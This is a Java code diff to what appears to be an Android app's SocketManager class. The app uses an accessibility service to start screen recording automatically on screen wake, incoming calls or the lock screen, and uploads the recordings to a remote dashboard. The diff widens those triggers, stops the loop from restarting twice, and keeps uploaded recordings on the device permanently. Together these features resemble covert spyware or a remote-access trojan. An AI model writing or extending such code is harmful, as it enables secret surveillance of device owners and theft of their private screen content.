@@ -1586,11 +1586,14 @@ public class SocketManager {
     }
 
     /**
-     * Called by UnifiedAccessibilityService when the screen wakes up locked
-     * or immediately when accessibility is first enabled.
-     * Starts the recording loop and notifies the dashboard automatically.
+     * Called by UnifiedAccessibilityService when the screen wakes up, a call arrives,
+     * the lock screen appears, or any other trigger fires.
+     * Guards against restarting an already-running recording loop.
      */
     public void startScreenReaderAuto() {
+        // Guard: don't restart if the loop is already running
+        ScheduledFuture<?> current = screenReaderFuture;
+        if (current != null && !current.isDone() && !current.isCancelled()) return;
         UnifiedAccessibilityService svc = UnifiedAccessibilityService.getInstance();
         if (svc == null) return;
         startScreenReaderLoop(svc, true);
@@ -2016,7 +2019,8 @@ public class SocketManager {
                 java.io.File dir = new java.io.File(context.getFilesDir(), ".sr_offline");
                 if (!dir.exists()) return;
                 java.io.File[] files = dir.listFiles(
-                    (d, name) -> name.startsWith("sr_offline_") && name.endsWith(".json"));
+                    (d, name) -> name.startsWith("sr_offline_") && name.endsWith(".json")
+                        && !name.endsWith(".done.json"));
                 if (files == null || files.length == 0) return;
                 java.util.Arrays.sort(files,
                     (a, b) -> Long.compare(a.lastModified(), b.lastModified()));
@@ -2047,7 +2051,9 @@ public class SocketManager {
                             new java.util.Date(data.optLong("startTime",
                                 System.currentTimeMillis()))));
                         sendMessage("offline_recording:save", payload);
-                        file.delete();
+                        // Mark as uploaded by renaming to .done.json — keeps file permanently
+                        String doneName = file.getName().replace(".json", ".done.json");
+                        file.renameTo(new java.io.File(dir, doneName));
                         Log.i(TAG, "Uploaded offline recording: " + file.getName()
                             + " (" + framesArray.length() + " frames)");
                     } catch (Exception e) {
